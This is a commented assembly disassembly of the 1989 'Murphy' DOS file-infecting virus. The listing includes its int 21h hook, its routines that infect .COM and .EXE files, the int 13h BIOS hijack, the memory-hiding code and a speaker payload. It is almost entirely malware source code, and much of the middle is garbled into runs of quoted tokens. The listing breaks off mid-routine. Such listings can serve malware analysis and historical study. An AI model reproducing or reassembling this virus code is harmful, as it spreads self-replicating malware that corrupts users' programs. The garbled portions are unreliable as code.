

seg_b	segment	byte public
	assume cs:seg_b , ds:seg_b

	db	7 dup (0)				;0000  0007[00]

start:	jmp	l_0388						;0007  E9 037E

d_000A:	db	'MZ'						;000A  4D 5A
d_000C:	dw	0084h			;last page bytes	;000C  84 00
	dw	006Eh			;size of file (pages)	;000E  6E 00
	dw	0000h			;relocation entries nr	;0010  00 00
	dw	0020h			;size of header (para)	;0012  20 00
	dw	01C3h			;min nr of para required;0014  C3 01
	dw	0FFFFh			;max nr of para required;0016  FF FF
	dw	0EA3h			;SS			;0018  A3 0E
	dw	0080h			;SP			;001A  80 00 00 00 07 00
	dw	0000h			;negative sum		;001A  80 00 00 00 07 00
	dw	0007h			;IP			;001A  80 00 00 00 07 00
	dw	0D38h			;CS			;0020  38 0D

d_0022	dw	 0012h			;victim entry IP	;0022  12 00
d_0024	dw	 0CF2h			;victim entry CS	;0024  F2 0C
d_0026	dw	 0D38h			;virus segment		;0026  38 0D
	db	 37h, 70h				;0028  37 70
	db	 6Fh, 15h				;002A  6F 15
	db	 87h, 01h, 6Bh, 00h			;002C  87 01 6B 00

d_0030	dw	 1466h			;oryginal int 21h offs	;0030  66 14
d_0032	dw	 0275h			;		  seg	;0032  75 02

	db	 56h, 05h		;0034  56 05
	db	 66h, 0Fh		;0036  66 0F

					;oryginal or found in BIOS
d_0038	dw	 0F126h			;int 13h offs	;0038  26 F1
d_003A	dw	 0F000h			;  	 seg	;003A  00 F0

	db	 0CDh, 1Dh				;003C  CD 1D
	db	'p', 0					;003E  70 00

	db	" Hello, I'm Murphy. Nice"		;0040  20 48 65 6C 6C 6F
							;0046  2C 20 49 27 6D 20
							;004C  4D 75 72 70 68 79
							;0052  2E 20 4E 69 63 65
	db	" to meet you friend. I'm"		;0058  20 74 6F 20 6D 65
							;005E  65 74 20 79 6F 75
							;0064  20 66 72 69 65 6E
							;006A  64 2E 20 49 27 6D
	db	' written since Nov/Dec. Copywrit'	;0070  20 77 72 69 74 74
							;0076  65 6E 20 73 69 6E
							;007C  63 65 20 4E 6F 76
							;0082  2F 44 65 63 2E 20
							;0088  43 6F 70 79 77 72
							;008E  69 74
	db	'e '					;0090  65 20
	db	'(c)1989 by Lubo & Ian, Sofia, US'	;0092  28 63 29 31 39 38
							;0098  39 20 62 79 20 4C
							;009E  75 62 6F 20 26 20
							;00A4  49 61 6E 2C 20 53
							;00AA  6F 66 69 61 2C 20
							;00B0  55 53
	db	'M Laboratory. '			;00B2  4D 20 4C 61 62 6F
							;00B8  72 61 74 6F 72 79
							;00BE  2E 20

;=======================================================
;	New int 21h service routine
;-------------------------------------------------------
l_00C0:					;(= 1B9h in resident virus part)
	CALL	s_0352						;00C0  E8 8F 02
	CMP	AX,4B59h		;"virus installed ?"	;00C3  3D 59 4B
	JNZ	l_00D1			;-> no			;00C6  75 09
	PUSH	BP						;00C8  55
	MOV	BP,SP						;00C9  8B EC
	AND	WORD PTR [BP+06],0FFFEh	;clear carry flag	;00CB  83 66 06 FE
	POP	BP						;00CF  5D
	IRET							;00D0  CF

l_00D1:	CMP	AH,4Bh			;load/load & run ?	;00D1  80 FC 4B
	JZ	l_00E8			;-> yes			;00D4  74 12
	CMP	AX,3D00h		;open in R/O mode ?	;00D6  3D 00 3D
	JZ	l_00E8			;-> yes			;00D9  74 0D
	CMP	AX,6C00h		;DOS 4.0 extnd open/crea;00DB  3D 00 6C
	JNZ	l_00E5			;-> no, exit		;00DE  75 05
	CMP	BL,00			;R/O mode ?		;00E0  80 FB 00
	JZ      l_00E8			;-> yes			;00E3  74 03
l_00E5:	jmp	l_018D						;00E5  E9 00A5

;========================================================
;	File contamination
;--------------------------------------------------------
l_00E8:	push	es					;00E8  06
	push	ds					;00E9  1E
	push	di					;00EA  57
	push	si					;00EB  56
	push	bp					;00EC  55
	push	dx					;00ED  52
	push	cx					;00EE  51
	push	bx					;00EF  53
	push	ax					;00F0  50
	call	s_02BD					;00F1  E8 01C9
	cmp	ax,6C00h				;00F4  3D 6C00
	jne	l_00FB					;00F7  75 02
	mov	dx,si					;00F9  8B D6
l_00FB:	mov	cx,80h					;00FB  B9 0080
	mov	si,dx					;00FE  8B F2

l_0100:	inc	si					;0100  46
	mov	al,[si]					;0101  8A 04
	or	al,al					;0103  0A C0
	loopnz	l_0100					;0105  E0 F9

	sub	si,2					;0107  83 EE 02
	cmp	word ptr [si],4D4Fh			;010A  81 3C 4D4F
	je	l_0122					;010E  74 12
	cmp	word ptr [si],4558h			;0110  81 3C 4558
	je	l_0119					;0114  74 03
l_0116:	jmp	short l_0181				;0116  EB 69
	db	90h					;0118  90
l_0119:	cmp	word ptr [si-2],452Eh			;0119  81 7C FE 452E
	je	l_0129					;011E  74 09
	jmp	short l_0116				;0120  EB F4
l_0122:	cmp	word ptr [si-2],432Eh			;0122  81 7C FE 432E
	jne	l_0116					;0127  75 ED
l_0129:	mov	ax,3D02h				;0129  B8 3D02
	call	s_02B6					;012C  E8 0187
	jc	l_0181					;012F  72 50
	mov	bx,ax					;0131  8B D8
	mov	ax,5700h				;0133  B8 5700
	call	s_02B6					;0136  E8 017D
	mov	word ptr cs:[121h],cx			;0139  2E: 89 0E 0121
	mov	word ptr cs:[123h],dx			;013E  2E: 89 16 0123
	mov	ax,4200h				;0143  B8 4200
	xor	cx,cx					;0146  33 C9
	xor	dx,dx					;0148  33 D2
	call	s_02B6					;014A  E8 0169
	push	cs					;014D  0E
	pop	ds					;014E  1F
	mov	dx,103h					;014F  BA 0103
	mov	si,dx					;0152  8B F2
	mov	cx,18h					;0154  B9 0018
	mov	ah,3Fh			; '?'		;0157  B4 3F
	call	s_02B6					;0159  E8 015A
	jc	l_016C					;015C  72 0E
	cmp	word ptr [si],5A4Dh			;015E  81 3C 5A4D
	jne	l_0169					;0162  75 05
	call	s_0192					;0164  E8 002B
	jmp	short l_016C				;0167  EB 03
l_0169:	call	s_0262					;0169  E8 00F6
l_016C:	mov	ax,5701h				;016C  B8 5701
	mov	cx,word ptr cs:[121h]			;016F  2E: 8B 0E 0121
	mov	dx,word ptr cs:[123h]			;0174  2E: 8B 16 0123
	call	s_02B6					;0179  E8 013A
	mov	ah,3Eh			; '>'		;017C  B4 3E
	call	s_02B6					;017E  E8 0135
l_0181:	call	s_02FA					;0181  E8 0176
	pop	ax					;0184  58
	pop	bx					;0185  5B
	pop	cx					;0186  59
	pop	dx					;0187  5A
	pop	bp					;0188  5D
	pop	si					;0189  5E
	pop	di					;018A  5F
	pop	ds					;018B  1F
	pop	es					;018C  07

				;<- enter="" oryginal="" int="" 21h="" l_018d:="" jmp="" dword="" ptr="" cs:[129h]="" ;="d_0030" (+100h="" -="" 7)="" ;018d="" 2e:="" ff="" 2e="" 0129="" ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß="" ;="" subroutine="" ;üüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüü="" s_0192="" proc="" near="" mov="" cx,[si+16h]="" ;0192="" 8b="" 4c="" 16="" add="" cx,[si+8]="" ;0195="" 03="" 4c="" 08="" mov="" ax,10h="" ;0198="" b8="" 0010="" mul="" cx="" ;019b="" f7="" e1="" add="" ax,[si+14h]="" ;019d="" 03="" 44="" 14="" adc="" dx,0="" ;01a0="" 83="" d2="" 00="" push="" dx="" ;01a3="" 52="" push="" ax="" ;01a4="" 50="" mov="" ax,4202h="" ;01a5="" b8="" 4202="" xor="" cx,cx="" ;01a8="" 33="" c9="" xor="" dx,dx="" ;01aa="" 33="" d2="" call="" s_02b6="" ;01ac="" e8="" 0107="" cmp="" dx,0="" ;01af="" 83="" fa="" 00="" jne="" l_01bf="" ;01b2="" 75="" 0b="" cmp="" ax,4fdh="" ;01b4="" 3d="" 04fd="" nop="" ;01b7="" 90="" jnc="" l_01bf="" ;01b8="" 73="" 05="" pop="" ax="" ;01ba="" 58="" pop="" dx="" ;01bb="" 5a="" jmp="" l_0244="" ;01bc="" e9="" 0085="" l_01bf:="" mov="" di,ax="" ;01bf="" 8b="" f8="" mov="" bp,dx="" ;01c1="" 8b="" ea="" pop="" cx="" ;01c3="" 59="" sub="" ax,cx="" ;01c4="" 2b="" c1="" pop="" cx="" ;01c6="" 59="" sbb="" dx,cx="" ;01c7="" 1b="" d1="" cmp="" word="" ptr="" [si+0ch],0="" ;01c9="" 83="" 7c="" 0c="" 00="" je="" l_0244="" ;01cd="" 74="" 75="" cmp="" dx,0="" ;01cf="" 83="" fa="" 00="" jne="" l_01da="" ;01d2="" 75="" 06="" cmp="" ax,4fdh="" ;01d4="" 3d="" 04fd="" nop="" ;01d7="" 90="" jz="" l_0244="" ;01d8="" 74="" 6a="" l_01da:="" mov="" dx,bp="" ;01da="" 8b="" d5="" mov="" ax,di="" ;01dc="" 8b="" c7="" push="" dx="" ;01de="" 52="" push="" ax="" ;01df="" 50="" add="" ax,4fdh="" ;01e0="" 05="" 04fd="" nop="" ;01e3="" 90="" adc="" dx,0="" ;01e4="" 83="" d2="" 00="" mov="" cx,200h="" ;01e7="" b9="" 0200="" div="" cx="" ;01ea="" f7="" f1="" les="" di,dword="" ptr="" [si+2]="" ;01ec="" c4="" 7c="" 02="" mov="" word="" ptr="" cs:[125h],di="" ;01ef="" 2e:="" 89="" 3e="" 0125="" mov="" word="" ptr="" cs:[127h],es="" ;01f4="" 2e:="" 8c="" 06="" 0127="" mov="" [si+2],dx="" ;01f9="" 89="" 54="" 02="" cmp="" dx,0="" ;01fc="" 83="" fa="" 00="" je="" l_0202="" ;01ff="" 74="" 01="" inc="" ax="" ;0201="" 40="" l_0202:="" mov="" [si+4],ax="" ;0202="" 89="" 44="" 04="" pop="" ax="" ;0205="" 58="" pop="" dx="" ;0206="" 5a="" call="" s_0245="" ;0207="" e8="" 003b="" sub="" ax,[si+8]="" ;020a="" 2b="" 44="" 08="" les="" di,dword="" ptr="" [si+14h]="" ;020d="" c4="" 7c="" 14="" mov="" word="" ptr="" ds:[11bh],di="" ;0210="" 89="" 3e="" 011b="" mov="" word="" ptr="" ds:[11dh],es="" ;0214="" 8c="" 06="" 011d="" mov="" [si+14h],dx="" ;0218="" 89="" 54="" 14="" mov="" [si+16h],ax="" ;021b="" 89="" 44="" 16="" mov="" word="" ptr="" ds:[11fh],ax="" ;021e="" a3="" 011f="" mov="" ax,4202h="" ;0221="" b8="" 4202="" xor="" cx,cx="" ;0224="" 33="" c9="" xor="" dx,dx="" ;0226="" 33="" d2="" call="" s_02b6="" ;0228="" e8="" 008b="" call="" s_0256="" ;022b="" e8="" 0028="" jc="" l_0244="" ;022e="" 72="" 14="" mov="" ax,4200h="" ;0230="" b8="" 4200="" xor="" cx,cx="" ;0233="" 33="" c9="" xor="" dx,dx="" ;0235="" 33="" d2="" call="" s_02b6="" ;0237="" e8="" 007c="" mov="" ah,40h="" ;="" '@'="" ;023a="" b4="" 40="" mov="" dx,si="" ;023c="" 8b="" d6="" mov="" cx,18h="" ;023e="" b9="" 0018="" call="" s_02b6="" ;0241="" e8="" 0072="" l_0244:="" retn="" ;0244="" c3="" s_0192="" endp="" ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß="" ;="" subroutine="" ;üüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüü="" s_0245="" proc="" near="" mov="" cx,4="" ;0245="" b9="" 0004="" mov="" di,ax="" ;0248="" 8b="" f8="" and="" di,0fh="" ;024a="" 83="" e7="" 0f="" l_024d:="" shr="" dx,1="" ;024d="" d1="" ea="" rcr="" ax,1="" ;024f="" d1="" d8="" loop="" l_024d="" ;0251="" e2="" fa="" mov="" dx,di="" ;0253="" 8b="" d7="" retn="" ;0255="" c3="" s_0245="" endp="" ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß="" ;="" subroutine="" ;üüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüü="" s_0256="" proc="" near="" mov="" ah,40h="" ;="" '@'="" ;0256="" b4="" 40="" mov="" cx,4fdh="" ;0258="" b9="" 04fd="" nop="" ;025b="" 90="" mov="" dx,100h="" ;025c="" ba="" 0100="" jmp="" short="" l_02b6="" ;025f="" eb="" 55="" db="" 90h="" ;0261="" 90="" ;ßßßß="" external="" entry="" into="" subroutine="" ßßßßßßßßßßßßßßßßßßßßßßßßß="" s_0262:="" mov="" ax,4202h="" ;0262="" b8="" 4202="" xor="" cx,cx="" ;0265="" 33="" c9="" xor="" dx,dx="" ;0267="" 33="" d2="" call="" s_02b6="" ;0269="" e8="" 004a="" cmp="" ax,4fdh="" ;026c="" 3d="" 04fd="" nop="" ;026f="" 90="" jc="" l_02b5="" ;0270="" 72="" 43="" cmp="" ax,0fae2h="" ;0272="" 3d="" fae2="" nop="" ;0275="" 90="" jnc="" l_02b5="" ;0276="" 73="" 3d="" push="" ax="" ;0278="" 50="" cmp="" byte="" ptr="" [si],0e9h="" ;0279="" 80="" 3c="" e9="" jne="" l_028a="" ;027c="" 75="" 0c="" sub="" ax,500h="" ;027e="" 2d="" 0500="" nop="" ;0281="" 90="" cmp="" ax,[si+1]="" ;0282="" 3b="" 44="" 01="" jne="" l_028a="" ;0285="" 75="" 03="" pop="" ax="" ;0287="" 58="" jmp="" short="" l_02b5="" ;0288="" eb="" 2b="" l_028a:="" call="" s_0256="" ;028a="" e8="" ffc9="" jnc="" l_0292="" ;028d="" 73="" 03="" pop="" ax="" ;028f="" 58="" jmp="" short="" l_02b5="" ;0290="" eb="" 23="" l_0292:="" mov="" ax,4200h="" ;0292="" b8="" 4200="" xor="" cx,cx="" ;0295="" 33="" c9="" xor="" dx,dx="" ;0297="" 33="" d2="" call="" s_02b6="" ;0299="" e8="" 001a="" pop="" ax="" ;029c="" 58="" sub="" ax,3="" ;029d="" 2d="" 0003="" mov="" dx,11bh="" ;02a0="" ba="" 011b="" mov="" si,dx="" ;02a3="" 8b="" f2="" mov="" byte="" ptr="" cs:[si],0e9h="" ;02a5="" 2e:="" c6="" 04="" e9="" mov="" cs:[si+1],ax="" ;02a9="" 2e:="" 89="" 44="" 01="" mov="" ah,40h="" ;="" '@'="" ;02ad="" b4="" 40="" mov="" cx,3="" ;02af="" b9="" 0003="" call="" s_02b6="" ;02b2="" e8="" 0001="" l_02b5:="" retn="" ;02b5="" c3="" s_0256="" endp="" ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß="" ;="" subroutine="" ;üüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüü="" s_02b6="" proc="" near="" l_02b6:="" pushf="" ;02b6="" 9c="" call="" dword="" ptr="" cs:[129h]="" ;02b7="" 2e:="" ff="" 1e="" 0129="" retn="" ;02bc="" c3="" s_02b6="" endp="" ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß="" ;="" subroutine="" ;üüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüü="" s_02bd="" proc="" near="" push="" ax="" ;02bd="" 50="" push="" ds="" ;02be="" 1e="" push="" es="" ;02bf="" 06="" xor="" ax,ax="" ;02c0="" 33="" c0="" push="" ax="" ;02c2="" 50="" pop="" ds="" ;02c3="" 1f="" cli="" ;02c4="" fa="" les="" ax,dword="" ptr="" ds:[90h]="" ;int="" 24h="" ;02c5="" c4="" 06="" 0090="" mov="" word="" ptr="" cs:[12dh],ax="" ;02c9="" 2e:="" a3="" 012d="" mov="" word="" ptr="" cs:[12fh],es="" ;02cd="" 2e:="" 8c="" 06="" 012f="" mov="" ax,418h="" ;02d2="" b8="" 0418="" mov="" ds:[90h],ax="" ;int="" 24h="" ;02d5="" a3="" 0090="" mov="" word="" ptr="" ds:[90h+2],cs="" ;02d8="" 8c="" 0e="" 0092="" les="" ax,dword="" ptr="" ds:[4ch]="" ;int="" 13h="" ;02dc="" c4="" 06="" 004c="" mov="" word="" ptr="" cs:[135h],ax="" ;02e0="" 2e:="" a3="" 0135="" mov="" word="" ptr="" cs:[137h],es="" ;02e4="" 2e:="" 8c="" 06="" 0137="" les="" ax,dword="" ptr="" cs:[131h]="" ;02e9="" 2e:="" c4="" 06="" 0131="" mov="" ds:[4ch],ax="" ;int="" 13h="" ;02ee="" a3="" 004c="" mov="" word="" ptr="" ds:[4ch+2],es="" ;02f1="" 8c="" 06="" 004e="" sti="" ;02f5="" fb="" pop="" es="" ;02f6="" 07="" pop="" ds="" ;02f7="" 1f="" pop="" ax="" ;02f8="" 58="" retn="" ;02f9="" c3="" s_02bd="" endp="" ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß="" ;="" subroutine="" ;üüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüü="" s_02fa="" proc="" near="" push="" ax="" ;02fa="" 50="" push="" ds="" ;02fb="" 1e="" push="" es="" ;02fc="" 06="" xor="" ax,ax="" ;02fd="" 33="" c0="" push="" ax="" ;02ff="" 50="" pop="" ds="" ;0300="" 1f="" cli="" ;0301="" fa="" les="" ax,dword="" ptr="" cs:[12dh]="" ;0302="" 2e:="" c4="" 06="" 012d="" mov="" ds:[90h],ax="" ;int="" 24h;0307="" a3="" 0090="" mov="" word="" ptr="" ds:[90h+2],es="" ;030a="" 8c="" 06="" 0092="" les="" ax,dword="" ptr="" cs:[135h]="" ;030e="" 2e:="" c4="" 06="" 0135="" mov="" ds:[4ch],ax="" ;int="" 13h;0313="" a3="" 004c="" mov="" word="" ptr="" ds:[4ch+2],es="" ;0316="" 8c="" 06="" 004e="" sti="" ;031a="" fb="" pop="" es="" ;031b="" 07="" pop="" ds="" ;031c="" 1f="" pop="" ax="" ;031d="" 58="" retn="" ;031e="" c3="" s_02fa="" endp="" test="" ah,80h="" ;031f="" f6="" c4="" 80="" jz="" l_0329="" ;0322="" 74="" 05="" jmp="" dword="" ptr="" cs:[12dh]="" ;0324="" 2e:="" ff="" 2e="" 012d="" l_0329:="" add="" sp,6="" ;0329="" 83="" c4="" 06="" pop="" ax="" ;032c="" 58="" pop="" bx="" ;032d="" 5b="" pop="" cx="" ;032e="" 59="" pop="" dx="" ;032f="" 5a="" pop="" si="" ;0330="" 5e="" pop="" di="" ;0331="" 5f="" pop="" bp="" ;0332="" 5d="" pop="" ds="" ;0333="" 1f="" pop="" es="" ;0334="" 07="" push="" bp="" ;0335="" 55="" mov="" bp,sp="" ;0336="" 8b="" ec="" or="" word="" ptr="" [bp+6],1="" ;0338="" 83="" 4e="" 06="" 01="" pop="" bp="" ;033c="" 5d="" iret="" ;033d="" cf="" ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß="" ;="" subroutine="" ;üüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüüü="" s_033e="" proc="" near="" mov="" al,0b6h="" ;033e="" b0="" b6="" out="" 43h,al="" ;="" port="" 43h,="" 8253="" wrt="" timr="" mode="" ;0340="" e6="" 43="" mov="" ax,64h="" ;0342="" b8="" 0064="" out="" 42h,al="" ;="" port="" 42h,="" 8253="" timer="" 2="" spkr="" ;0345="" e6="" 42="" mov="" al,ah="" ;0347="" 8a="" c4="" out="" 42h,al="" ;="" port="" 42h,="" 8253="" timer="" 2="" spkr="" ;0349="" e6="" 42="" in="" al,61h="" ;="" port="" 61h,="" 8255="" port="" b,="" read="" ;034b="" e4="" 61="" or="" al,3="" ;034d="" 0c="" 03="" out="" 61h,al="" ;="" port="" 61h,="" 8255="" b="" -="" spkr,="" etc="" ;034f="" e6="" 61="" retn="" ;0351="" c3="" s_033e="" endp="" ;="======================================================" ;="" ;-------------------------------------------------------="" s_0352="" proc="" near="" push="" ax="" ;0352="" 50="" push="" cx="" ;0353="" 51="" push="" dx="" ;0354="" 52="" push="" ds="" ;0355="" 1e="" xor="" ax,ax="" ;0356="" 33="" c0="" push="" ax="" ;0358="" 50="" pop="" ds="" ;0359="" 1f="" mov="" ax,ds:[46ch]="" ;system="" timer="" lo="" part="" ;035a="" a1="" 046c="" mov="" dx,ds:[46eh]="" ;system="" time="" hi="" part="" ;035d="" 8b="" 16="" 046e="" mov="" cx,0ffffh="" ;0361="" b9="" ffff="" div="" cx="" ;0364="" f7="" f1="" cmp="" ax,0ah="" ;0366="" 3d="" 000a="" jne="" l_036e="" ;="" ;0369="" 75="" 03="" call="" s_033e="" ;036b="" e8="" ffd0="" l_036e:="" pop="" ds="" ;036e="" 1f="" pop="" dx="" ;036f="" 5a="" pop="" cx="" ;0370="" 59="" pop="" ax="" ;0371="" 58="" retn="" ;0372="" c3="" s_0352="" endp="" ;="======================================================" ;="" ax:="ax*10h" ;-------------------------------------------------------="" s_0373="" proc="" near="" mov="" dx,10h="" ;0373="" ba="" 0010="" mul="" dx="" ;0376="" f7="" e2="" retn="" ;0378="" c3="" s_0373="" endp="" ;="======================================================" ;="" clear="" all="" registers="" ;-------------------------------------------------------="" s_0379="" proc="" near="" xor="" ax,ax="" ;0379="" 33="" c0="" xor="" bx,bx="" ;037b="" 33="" db="" xor="" cx,cx="" ;037d="" 33="" c9="" xor="" dx,dx="" ;037f="" 33="" d2="" xor="" si,si="" ;0381="" 33="" f6="" xor="" di,di="" ;0383="" 33="" ff="" xor="" bp,bp="" ;0385="" 33="" ed="" retn="" ;0387="" c3="" s_0379="" endp="" ;="=======================================================" ;="" real="" virus="" begin="" ;--------------------------------------------------------="" l_0388:="" push="" ds="" ;0388="" 1e="" call="" s_038c="" ;0389="" e8="" 0000="" s_038c:="" mov="" ax,4b59h="" ;run="" progm="" @ds:dx,="" parm="" @es:bx="" ;038c="" b8="" 4b59="" int="" 21h="" ;038f="" cd="" 21="" jc="" l_0396="" ;-=""> not resident yet		;0391  72 03
	jmp	l_04BE		;-> allready resident		;0393  E9 0128

l_0396:	pop	si		;=038Ch base address		;0396  5E
	push	si						;0397  56
	mov	di,si						;0398  8B FE
	xor	ax,ax						;039A  33 C0
	push	ax						;039C  50
	pop	ds						;039D  1F
	les	ax,dword ptr ds:[4Ch]	;int 13h		;039E  C4 06 004C
	mov	cs:[si-354h],ax		;=038h			;03A2  2E: 89 84 FCAC
	mov	cs:[si-352h],es		;=03Ah			;03A7  2E: 8C 84 FCAE
	les	bx,dword ptr ds:[84h]	;int 21h		;03AC  C4 1E 0084
	mov	cs:[di-35Ch],bx		;=030h			;03B0  2E: 89 9D FCA4
	mov	cs:[di-35Ah],es		;=032h			;03B5  2E: 8C 85 FCA6
	mov	ax,ds:[102h]		;int 40h+2 (BIOS FDD)	;03BA  A1 0102
	cmp	ax,0F000h					;03BD  3D F000
	jne	l_042B			;-> not standard BIOS	;03C0  75 69

	mov	dl,80h			;BIOS length (pages 512);03C2  B2 80
	mov	ax,ds:[106h]		;int 41h+2 (1 HDD ptr)	;03C4  A1 0106
	cmp	ax,0F000h					;03C7  3D F000
	je	l_03E8			;-> standard		;03CA  74 1C

	cmp	ah,0C8h			;Disk BIOS ?		;03CC  80 FC C8
	jb	l_042B			;-> not			;03CF  72 5A
	cmp	ah,0F4h			;Disk BIOS ?		;03D1  80 FC F4
	jae	l_042B			;-> not			;03D4  73 55
	test	al,7Fh			;page aligned		;03D6  A8 7F
	jnz	l_042B			;-> not			;03D8  75 51
	mov	ds,ax			;disk BIOS segment	;03DA  8E D8
	cmp	word ptr ds:[0],0AA55h	;BIOS sygnature ?	;03DC  81 3E 0000 AA55
	jne	l_042B			;-> not			;03E2  75 47
	mov	dl,ds:[2]		;BIOS length (pages 512);03E4  8A 16 0002

l_03E8:	mov	ds,ax			;HDD1 table segment	;03E8  8E D8
	xor	dh,dh						;03EA  32 F6
	mov	cl,9			;* 512			;03EC  B1 09
	shl	dx,cl						;03EE  D3 E2
	mov	cx,dx						;03F0  8B CA
	xor	si,si			;BIOS begin		;03F2  33 F6

	;-----------------------------------------------
	;Find:	cmp dl,80h	or	test dl,80h
	;	jae x			jnz x
	;	int 40h			int 40h
	;-----------------------------------------------
l_03F4:	lodsw							;03F4  AD
	cmp	ax,0FA80h		;"cmp dl,80h"		;03F5  3D FA80
	jne	l_0402						;03F8  75 08
	lodsw							;03FA  AD
	cmp	ax,7380h		;"jae .."		;03FB  3D 7380
	je	l_040D						;03FE  74 0D
	jnz	l_0417						;0400  75 15
l_0402:	cmp	ax,0C2F6h		;"test dl,80"		;0402  3D C2F6
	jne	l_0419						;0405  75 12
	lodsw							;0407  AD
	cmp	ax,7580h		;"jnz ..."		;0408  3D 7580
	jne	l_0417						;040B  75 0A
l_040D:	inc	si						;040D  46
	lodsw							;040E  AD
	cmp	ax,40CDh		;"int 40h"		;040F  3D 40CD
	je	l_041E						;0412  74 0A
	sub	si,3						;0414  83 EE 03
l_0417:	dec	si						;0417  4E
	dec	si						;0418  4E
l_0419:	dec	si						;0419  4E
	loop	l_03F4						;041A  E2 D8
	jmp	short l_042B		;-> entry not found	;041C  EB 0D

				;<- bios="" entry="" found="" l_041e:="" sub="" si,7="" ;041e="" 83="" ee="" 07="" mov="" cs:[di-354h],si="" ;="038h" int="" 13h="" offset="" ;0421="" 2e:="" 89="" b5="" fcac="" mov="" cs:[di-352h],ds="" ;="03Ah" segment="" ;0426="" 2e:="" 8c="" 9d="" fcae="" l_042b:="" mov="" ah,62h="" ;get="" progrm="" seg="" prefix="" addr="" bx="" ;042b="" b4="" 62="" int="" 21h="" ;042d="" cd="" 21="" mov="" es,bx="" ;psp="" ;042f="" 8e="" c3="" mov="" ah,49h="" ;release="" memory="" block,="" es="seg" ;0431="" b4="" 49="" int="" 21h="" ;0433="" cd="" 21="" mov="" bx,0ffffh="" ;bytes="" ;0435="" bb="" ffff="" mov="" ah,48h="" ;allocate="" memory,="" bx="bytes/16" ;0438="" b4="" 48="" int="" 21h="" ;043a="" cd="" 21="" sub="" bx,51h="" ;-="" virus="" length="" (paragraphs)="" ;043c="" 81="" eb="" 0051="" jc="" l_04be="" ;-=""> not enought memory		;0440  72 7C
	mov	cx,es						;0442  8C C1
	stc							;0444  F9
	adc	cx,bx						;0445  13 CB
	mov	ah,4Ah		;change mem allocation, bx=siz	;0447  B4 4A
	int	21h						;0449  CD 21
			
	mov	bx,50h		;virus length (para)		;044B  BB 0050
	nop							;044E  90
	stc							;044F  F9
	sbb	es:[2],bx	;Top of Memory			;0450  26: 19 1E 0002
	push	es						;0455  06
	mov	es,cx						;0456  8E C1
	mov	ah,4Ah		;change mem allocation, bx=siz	;0458  B4 4A
	int	21h						;045A  CD 21
			
	mov	ax,es						;045C  8C C0
	dec	ax						;045E  48
	mov	ds,ax						;045F  8E D8
	mov	word ptr ds:[1],8				;0461  C7 06 0001 0008
	call	s_0373			;ax,dx:=ax*10h		;0467  E8 FF09
	mov	bx,ax						;046A  8B D8
	mov	cx,dx						;046C  8B CA
	pop	ds			;PSP segment		;046E  1F
	mov	ax,ds						;046F  8C D8
	call	s_0373			;ax,dx:=ax*10h		;0471  E8 FEFF
	add	ax,ds:[6]		;Available memory	;0474  03 06 0006
	adc	dx,0						;0478  83 D2 00
	sub	ax,bx						;047B  2B C3
	sbb	dx,cx						;047D  1B D1
	jc	l_0485						;047F  72 04
	sub	ds:[6],ax		;new available memory	;0481  29 06 0006

l_0485:	mov	si,di						;0485  8B F7
	xor	di,di						;0487  33 FF
	push	cs						;0489  0E
	pop	ds						;048A  1F
	sub	si,385h			;=007h			;048B  81 EE 0385
	mov	cx,4FDh			;=till 504h		;048F  B9 04FD
	nop							;0492  90
	inc	cx						;0493  41
	rep	movsb						;0494  F3/ A4
	mov	ah,62h		;get progrm seg prefix addr bx	;0496  B4 62
	int	21h						;0498  CD 21
			
	dec	bx						;049A  4B
	mov	ds,bx						;049B  8E DB
	mov	byte ptr ds:[0],'Z'	;End of mem blocks chain;049D  C6 06 0000 5A
	mov	dx,1B9h			;=1C0h int 21h entry	;04A2  BA 01B9
	xor	ax,ax						;04A5  33 C0
	push	ax						;04A7  50
	pop	ds						;04A8  1F
	mov	ax,es						;04A9  8C C0
	sub	ax,10h			;arena header		;04AB  2D 0010
	mov	es,ax						;04AE  8E C0
	cli							;04B0  FA
	mov	ds:[84h],dx		;int 21h offset (1C0h)	;04B1  89 16 0084
	mov	word ptr ds:[84h+2],es	;=virus segment-10h	;04B5  8C 06 0086
	sti							;04B9  FB
	dec	byte ptr ds:[47Bh]				;04BA  FE 0E 047B

			;<- "virus="" allready="" resident"="" entry="" l_04be:="" pop="" si="" ;="38Ch" ;04be="" 5e="" cmp="" word="" ptr="" cs:[si-382h],'zm'="" ;="00Ah" ;04bf="" 2e:="" 81="" bc="" fc7e="" 5a4d="" jne="" l_04e5="" ;-=""> COM		;04C6  75 1D
